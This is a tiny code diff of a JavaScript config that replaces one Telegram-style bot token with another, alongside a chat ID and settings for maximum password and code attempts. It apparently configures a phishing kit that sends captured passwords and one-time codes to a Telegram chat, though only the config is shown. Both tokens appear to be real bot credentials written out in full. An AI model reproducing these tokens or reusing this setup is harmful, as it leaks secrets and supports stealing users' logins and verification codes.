@@ -1,5 +1,5 @@
 const config = {
-    token: '8868033959:AAGGXQolo0gyrd9SvxLkvm4xpMDs4IrA5MA',
+    token: '8814652518:AAGDjlmfm7-nuDBCAMK3rYndmz1ZxKDdE3A',
     chat_id: '-5164935871',
     max_password_attempts: 2,
     max_code_attempts: 4,
